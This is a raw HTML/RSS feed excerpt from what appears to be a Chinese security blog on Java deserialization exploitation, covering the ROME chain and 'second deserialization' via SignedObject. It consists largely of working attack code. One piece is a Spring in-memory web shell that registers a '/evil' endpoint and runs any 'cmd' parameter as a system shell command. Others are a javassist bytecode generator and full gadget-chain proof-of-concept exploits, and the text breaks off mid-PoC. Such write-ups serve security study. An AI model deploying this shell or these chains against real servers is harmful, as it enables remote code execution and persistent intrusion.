operator">=</span> <span class="token class-name">InjectToController</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">.</span><span class="token function">getMethod</span><span class="token punctuation">(</span><span class="token string">"exec"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//        PatternsRequestCondition url = new PatternsRequestCondition("/evil");</span>        <span class="token class-name">RequestMethodsRequestCondition</span> ms <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">RequestMethodsRequestCondition</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//        RequestMappingInfo info = new RequestMappingInfo(url, ms, null, null, null, null, null);</span>        <span class="token class-name">RequestMappingInfo</span> info <span class="token operator">=</span> <span class="token class-name">RequestMappingInfo</span><span class="token punctuation">.</span><span class="token function">paths</span><span class="token punctuation">(</span><span class="token string">"/evil"</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">options</span><span class="token punctuation">(</span>config<span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">build</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token class-name">InjectToController</span> injectToController <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">InjectToController</span><span class="token punctuation">(</span><span class="token string">"aaa"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        mappingHandlerMapping<span class="token punctuation">.</span><span class="token function">registerMapping</span><span class="token punctuation">(</span>info<span class="token punctuation">,</span> injectToController<span class="token punctuation">,</span> method2<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">public</span> <span class="token class-name">InjectToController</span><span class="token punctuation">(</span><span class="token class-name">String</span> arg<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span>    <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">exec</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token class-name">HttpServletRequest</span> request <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token class-name">ServletRequestAttributes</span><span class="token punctuation">)</span> <span class="token punctuation">(</span><span class="token class-name">RequestContextHolder</span><span class="token punctuation">.</span><span class="token function">currentRequestAttributes</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getRequest</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token class-name">HttpServletResponse</span> response <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token class-name">ServletRequestAttributes</span><span class="token punctuation">)</span> <span class="token punctuation">(</span><span class="token class-name">RequestContextHolder</span><span class="token punctuation">.</span><span class="token function">currentRequestAttributes</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getResponse</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">try</span> <span class="token punctuation">&#123;</span>            <span class="token class-name">String</span> arg0 <span class="token operator">=</span> request<span class="token punctuation">.</span><span class="token function">getParameter</span><span class="token punctuation">(</span><span class="token string">"cmd"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token class-name">PrintWriter</span> writer <span class="token operator">=</span> response<span class="token punctuation">.</span><span class="token function">getWriter</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">if</span> <span class="token punctuation">(</span>arg0 <span class="token operator">!=</span> <span class="token keyword">null</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>                <span class="token class-name">String</span> o <span class="token operator">=</span> <span class="token string">""</span><span class="token punctuation">;</span>                <span class="token class-name"><span class="token namespace">java<span class="token punctuation">.</span>lang<span class="token punctuation">.</span></span>ProcessBuilder</span> p<span class="token punctuation">;</span>                <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token class-name">System</span><span class="token punctuation">.</span><span class="token function">getProperty</span><span class="token punctuation">(</span><span class="token string">"os.name"</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">toLowerCase</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">contains</span><span class="token punctuation">(</span><span class="token string">"win"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>                    p <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name"><span class="token namespace">java<span class="token punctuation">.</span>lang<span class="token punctuation">.</span></span>ProcessBuilder</span><span class="token punctuation">(</span><span class="token string">"cmd.exe"</span><span class="token punctuation">,</span> <span class="token string">"/c"</span><span class="token punctuation">,</span> arg0<span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span>                    p <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name"><span class="token namespace">java<span class="token punctuation">.</span>lang<span class="token punctuation">.</span></span>ProcessBuilder</span><span class="token punctuation">(</span><span class="token string">"/bin/sh"</span><span class="token punctuation">,</span> <span class="token string">"-c"</span><span class="token punctuation">,</span> arg0<span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token punctuation">&#125;</span>                <span class="token class-name"><span class="token namespace">java<span class="token punctuation">.</span>util<span class="token punctuation">.</span></span>Scanner</span> c <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name"><span class="token namespace">java<span class="token punctuation">.</span>util<span class="token punctuation">.</span></span>Scanner</span><span class="token punctuation">(</span>p<span class="token punctuation">.</span><span class="token function">start</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getInputStream</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">useDelimiter</span><span class="token punctuation">(</span><span class="token string">"\\A"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                o <span class="token operator">=</span> c<span class="token punctuation">.</span><span class="token function">hasNext</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">?</span> c<span class="token punctuation">.</span><span class="token function">next</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">:</span> o<span class="token punctuation">;</span>                c<span class="token punctuation">.</span><span class="token function">close</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                writer<span class="token punctuation">.</span><span class="token function">write</span><span class="token punctuation">(</span>o<span class="token punctuation">)</span><span class="token punctuation">;</span>                writer<span class="token punctuation">.</span><span class="token function">flush</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                writer<span class="token punctuation">.</span><span class="token function">close</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span>                response<span class="token punctuation">.</span><span class="token function">sendError</span><span class="token punctuation">(</span><span class="token number">404</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token punctuation">&#125;</span>        <span class="token punctuation">&#125;</span><span class="token keyword">catch</span> <span class="token punctuation">(</span><span class="token class-name">Exception</span> e<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>            e<span class="token punctuation">.</span><span class="token function">printStackTrace</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span>    <span class="token annotation punctuation">@Override</span>    <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">transform</span><span class="token punctuation">(</span><span class="token class-name">DOM</span> document<span class="token punctuation">,</span> <span class="token class-name">SerializationHandler</span><span class="token punctuation">[</span><span class="token punctuation">]</span> handlers<span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">TransletException</span> <span class="token punctuation">&#123;</span>    <span class="token punctuation">&#125;</span>    <span class="token annotation punctuation">@Override</span>    <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">transform</span><span class="token punctuation">(</span><span class="token class-name">DOM</span> document<span class="token punctuation">,</span> <span class="token class-name">DTMAxisIterator</span> iterator<span class="token punctuation">,</span> <span class="token class-name">SerializationHandler</span> handler<span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">TransletException</span> <span class="token punctuation">&#123;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>Utils 新增：</p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">private</span> <span class="token keyword">static</span> <span class="token keyword">byte</span><span class="token punctuation">[</span><span class="token punctuation">]</span> <span class="token class-name">GenerateMemShell</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">Exception</span><span class="token punctuation">&#123;</span>    <span class="token class-name">ClassPool</span> pool <span class="token operator">=</span> <span class="token class-name">ClassPool</span><span class="token punctuation">.</span><span class="token function">getDefault</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token class-name">CtClass</span> ctClass <span class="token operator">=</span> pool<span class="token punctuation">.</span><span class="token function">getCtClass</span><span class="token punctuation">(</span><span class="token string">"com.example.InjectToController"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">return</span> ctClass<span class="token punctuation">.</span><span class="token function">toBytecode</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>直接用 xstring 链打：</p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">package</span> <span class="token namespace">com<span class="token punctuation">.</span>example</span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">com<span class="token punctuation">.</span>sun<span class="token punctuation">.</span>org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>xalan<span class="token punctuation">.</span>internal<span class="token punctuation">.</span>xsltc<span class="token punctuation">.</span>trax<span class="token punctuation">.</span></span><span class="token class-name">TemplatesImpl</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">com<span class="token punctuation">.</span>sun<span class="token punctuation">.</span>org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>xpath<span class="token punctuation">.</span>internal<span class="token punctuation">.</span>objects<span class="token punctuation">.</span></span><span class="token class-name">XString</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">com<span class="token punctuation">.</span>sun<span class="token punctuation">.</span>syndication<span class="token punctuation">.</span>feed<span class="token punctuation">.</span>impl<span class="token punctuation">.</span></span><span class="token class-name">ToStringBean</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">org<span class="token punctuation">.</span>springframework<span class="token punctuation">.</span>aop<span class="token punctuation">.</span>target<span class="token punctuation">.</span></span><span class="token class-name">HotSwappableTargetSource</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">javax<span class="token punctuation">.</span>xml<span class="token punctuation">.</span>transform<span class="token punctuation">.</span></span><span class="token class-name">Templates</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>lang<span class="token punctuation">.</span>reflect<span class="token punctuation">.</span></span><span class="token class-name">Array</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>lang<span class="token punctuation">.</span>reflect<span class="token punctuation">.</span></span><span class="token class-name">Constructor</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>util<span class="token punctuation">.</span></span><span class="token class-name">HashMap</span></span><span class="token punctuation">;</span><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">XStringChain</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">Exception</span> <span class="token punctuation">&#123;</span><span class="token comment">//        TemplatesImpl tpl = Utils.getTemplatesImpl();</span>        <span class="token class-name">TemplatesImpl</span> tpl <span class="token operator">=</span> <span class="token class-name">Utils</span><span class="token punctuation">.</span><span class="token function">memTemplatesImpl</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token class-name">ToStringBean</span> toStringBean <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ToStringBean</span><span class="token punctuation">(</span><span class="token class-name">Templates</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">,</span> tpl<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token class-name">HotSwappableTargetSource</span> h1 <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">HotSwappableTargetSource</span><span class="token punctuation">(</span>toStringBean<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token class-name">HotSwappableTargetSource</span> h2 <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">HotSwappableTargetSource</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">XString</span><span class="token punctuation">(</span><span class="token string">"xxx"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token class-name">HashMap</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">Object</span><span class="token punctuation">,</span><span class="token class-name">Object</span><span class="token punctuation">></span></span> hashMap <span class="token operator">=</span> <span class="token function">makeMap</span><span class="token punctuation">(</span>h1<span class="token punctuation">,</span>h2<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token class-name">String</span> barr <span class="token operator">=</span> <span class="token class-name">Utils<span class="token punctuation">.</span>Serialize</span><span class="token punctuation">(</span>hashMap<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span>barr<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//        Utils.UnSerialize(barr);</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token class-name">HashMap</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">Object</span><span class="token punctuation">,</span> <span class="token class-name">Object</span><span class="token punctuation">></span></span> makeMap <span class="token punctuation">(</span><span class="token class-name">Object</span> v1<span class="token punctuation">,</span> <span class="token class-name">Object</span> v2 <span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">Exception</span> <span class="token punctuation">&#123;</span>        <span class="token class-name">HashMap</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">Object</span><span class="token punctuation">,</span> <span class="token class-name">Object</span><span class="token punctuation">></span></span> s <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">HashMap</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token punctuation">></span></span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token class-name">Utils<span class="token punctuation">.</span>SetValue</span><span class="token punctuation">(</span>s<span class="token punctuation">,</span> <span class="token string">"size"</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token class-name">Class</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token operator">?</span><span class="token punctuation">></span></span> nodeC<span class="token punctuation">;</span>        <span class="token keyword">try</span> <span class="token punctuation">&#123;</span>            nodeC <span class="token operator">=</span> <span class="token class-name">Class</span><span class="token punctuation">.</span><span class="token function">forName</span><span class="token punctuation">(</span><span class="token string">"java.util.HashMap$Node"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>        <span class="token keyword">catch</span> <span class="token punctuation">(</span> <span class="token class-name">ClassNotFoundException</span> e <span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            nodeC <span class="token operator">=</span> <span class="token class-name">Class</span><span class="token punctuation">.</span><span class="token function">forName</span><span class="token punctuation">(</span><span class="token string">"java.util.HashMap$Entry"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>        <span class="token class-name">Constructor</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token operator">?</span><span class="token punctuation">></span></span> nodeCons <span class="token operator">=</span> nodeC<span class="token punctuation">.</span><span class="token function">getDeclaredConstructor</span><span class="token punctuation">(</span><span class="token keyword">int</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">,</span> <span class="token class-name">Object</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">,</span> <span class="token class-name">Object</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">,</span> nodeC<span class="token punctuation">)</span><span class="token punctuation">;</span>        nodeCons<span class="token punctuation">.</span><span class="token function">setAccessible</span><span class="token punctuation">(</span><span class="token boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token class-name">Object</span> tbl <span class="token operator">=</span> <span class="token class-name">Array</span><span class="token punctuation">.</span><span class="token function">newInstance</span><span class="token punctuation">(</span>nodeC<span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token class-name">Array</span><span class="token punctuation">.</span><span class="token function">set</span><span class="token punctuation">(</span>tbl<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> nodeCons<span class="token punctuation">.</span><span class="token function">newInstance</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> v1<span class="token punctuation">,</span> v1<span class="token punctuation">,</span> <span class="token keyword">null</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token class-name">Array</span><span class="token punctuation">.</span><span class="token function">set</span><span class="token punctuation">(</span>tbl<span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> nodeCons<span class="token punctuation">.</span><span class="token function">newInstance</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> v2<span class="token punctuation">,</span> v2<span class="token punctuation">,</span> <span class="token keyword">null</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token class-name">Utils<span class="token punctuation">.</span>SetValue</span><span class="token punctuation">(</span>s<span class="token punctuation">,</span> <span class="token string">"table"</span><span class="token punctuation">,</span> tbl<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">return</span> s<span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="/blog/2025/02/17/Rome%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20250219182716500.png" alt="image-20250219182716500"></p>]]></content>
    
    
    <summary type="html">&lt;h1 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h1&gt;&lt;p&gt;参考：&lt;/p&gt;
&lt;p&gt;&lt;a href=&quot;https://boogipop.com/2024/02/12/%E6%98%93%E6%87%82%E7%9A%84Rome%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%A9%E7%94%A8%E9%93%BE%EF%BC%88%E6%9B%B4%E6%96%B0%EF%BC%89/&quot;&gt;https://boogipop.com/2024/02/12/%E6%98%93%E6%87%82%E7%9A%84Rome%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%A9%E7%94%A8%E9%93%BE%EF%BC%88%E6%9B%B4%E6%96%B0%EF%BC%89/&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;a href=&quot;https://xz.aliyun.com/news/12214&quot;&gt;https://xz.aliyun.com/news/12214&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;a href=&quot;https://drun1baby.top/2022/10/10/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B9%8BROME%E9%93%BE&quot;&gt;https://drun1baby.top/2022/10/10/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B9%8BROME%E9%93%BE&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;a href=&quot;https://luokuang1.github.io/2025/02/06/ROME%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/&quot;&gt;https://luokuang1.github.io/2025/02/06/ROME%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;a href=&quot;https://zjackky.github.io/post/java-security-rome-chain-1ojxop.html&quot;&gt;https://zjackky.github.io/post/java-security-rome-chain-1ojxop.html&lt;/a&gt;&lt;/p&gt;</summary>
    
    
    
    <category term="Web" scheme="http://c1oudfl0w0.github.io/blog/categories/Web/"/>
    
    
    <category term="Java" scheme="http://c1oudfl0w0.github.io/blog/tags/Java/"/>
    
    <category term="反序列化" scheme="http://c1oudfl0w0.github.io/blog/tags/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"/>
    
  </entry>
  
  <entry>
    <title>Java二次反序列化</title>
    <link href="http://c1oudfl0w0.github.io/blog/2025/02/17/Java%E4%BA%8C%E6%AC%A1%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"/>
    <id>http://c1oudfl0w0.github.io/blog/2025/02/17/Java%E4%BA%8C%E6%AC%A1%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/</id>
    <published>2025-02-17T07:58:13.000Z</published>
    <updated>2025-02-21T14:25:29.698Z</updated>
    
    <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>参考：</p><p><a href="https://stoocea.github.io/post/Java%E4%BA%8C%E6%AC%A1%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96.html">https://stoocea.github.io/post/Java%E4%BA%8C%E6%AC%A1%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96.html</a></p><p><a href="https://poriams.github.io/%E4%BA%8C%E6%AC%A1%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E7%9C%8B%E6%88%91%E4%B8%80%E5%91%BD%E9%80%9A%E5%85%B3">https://poriams.github.io/%E4%BA%8C%E6%AC%A1%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E7%9C%8B%E6%88%91%E4%B8%80%E5%91%BD%E9%80%9A%E5%85%B3</a></p><p><a href="https://longlone.top/%E5%AE%89%E5%85%A8/java/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/javaDeserializeLabs%20writeup/">https://longlone.top/%E5%AE%89%E5%85%A8/java/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/javaDeserializeLabs%20writeup/</a></p><p><a href="http://www.bmth666.cn/2022/09/20/java%E4%BA%8C%E6%AC%A1%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%9D%E6%8E%A2/index.html">http://www.bmth666.cn/2022/09/20/java%E4%BA%8C%E6%AC%A1%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%9D%E6%8E%A2/index.html</a></p><p>二次反序列化大多数时候是用来<strong>绕过黑名单的限制或不出网利用或者绕过一些<code>loadClass()</code>不能够加载数组的问题</strong>，不会作为一条单独且完整的利用链存在，而是作为一个中间节点，用来绕过</p><p>一般来说有这几个常见的利用类：SignedObject、RMIConnector、WrapperConnectionPoolDataSource</p><span id="more"></span><hr><h1 id="SignedObject"><a href="#SignedObject" class="headerlink" title="SignedObject"></a>SignedObject</h1><p>这是<code>java.security</code>下一个用于创建真实运行时对象的类，更具体地说，<code>SignedObject</code>的参数中需要一个<code>Serializable</code>对象</p><p><img src="/blog/2025/02/17/Java%E4%BA%8C%E6%AC%A1%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20250218084916485.png" alt="image-20250218084916485"></p><p>主要看 getObject</p><p><img src="/blog/2025/02/17/Java%E4%BA%8C%E6%AC%A1%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20250219190628112.png" alt="image-20250219190628112"></p><p>这里有一个 readObject，而构造方法里序列化数据传入的参数也是可控的</p><p><img src="/blog/2025/02/17/Java%E4%BA%8C%E6%AC%A1%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20250219191134508.png" alt="image-20250219191134508"></p><p>这里 content 是一个 byte 型数组 <code>private byte[] content;</code></p><p>参数可控，能够包含一个 serializeObject 并反序列化</p><p>先构造一个 SignedObject 调用 getObject() ，恶意对象选择 cc6 的 hashmap</p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token class-name">KeyPairGenerator</span> kpg <span class="token operator">=</span> <span class="token class-name">KeyPairGenerator</span><span class="token punctuation">.</span><span class="token function">getInstance</span><span class="token punctuation">(</span><span class="token string">"DSA"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>kpg<span class="token punctuation">.</span><span class="token function">initialize</span><span class="token punctuation">(</span><span class="token number">1024</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token class-name">KeyPair</span> kp <span class="token operator">=</span> kpg<span class="token punctuation">.</span><span class="token function">generateKeyPair</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token class-name">SignedObject</span> signedObject <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">SignedObject</span><span class="token punctuation">(</span><span class="token constant">CC6EXP</span><span class="token punctuation">.</span><span class="token function">getPayload</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> kp<span class="token punctuation">.</span><span class="token function">getPrivate</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token class-name">Signature</span><span class="token punctuation">.</span><span class="token function">getInstance</span><span class="token punctuation">(</span><span class="token string">"DSA"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>signedObject<span class="token punctuation">.</span><span class="token function">getObject</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="/blog/2025/02/17/Java%E4%BA%8C%E6%AC%A1%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20250219203025216.png" alt="image-20250219203025216"></p><p>接下来就需要找一个能够调用 getObject() 的链</p><br><p>作为一个 getter 方法，首先想到的就是像 fastjson，rome 这种会调用任意 getter 方法的链子</p><h2 id="Rome链"><a href="#Rome链" class="headerlink" title="Rome链"></a>Rome链</h2><p>Rome 中获取 getter 方法并调用的逻辑有两处地方，ToStringBean 的有参 toString 方法，Equalsbean 的 beanEquals 方法</p><p>唯一一个前提是无参，而 getObject 就是无参函数</p><h3 id="ToStringBean"><a href="#ToStringBean" class="headerlink" title="ToStringBean"></a>ToStringBean</h3><p>以 BadAttributeValueExpException 这条来拼好链（因为短），那么调用栈为：</p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token class-name">SignedObject</span>#<span class="token function">getObject</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token class-name">ToStringBean</span>#<span class="token function">toString</span><span class="token punctuation">(</span><span class="token class-name">String</span><span class="token punctuation">)</span><span class="token class-name">ToStringBean</span>#<span class="token function">toString</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token class-name">BadAttributeValueExpException</span>#<span class="token function">readObject</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>poc：</p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">package</span> <span class="token namespace">com<span class="token punctuation">.</span>example</span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">com<span class="token punctuation">.</span>sun<span class="token punctuation">.</span>syndication<span class="token punctuation">.</span>feed<span class="token punctuation">.</span>impl<span class="token punctuation">.</span></span><span class="token class-name">ToStringBean</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>security<span class="token punctuation">.</span></span><span class="token class-name">Signature</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token 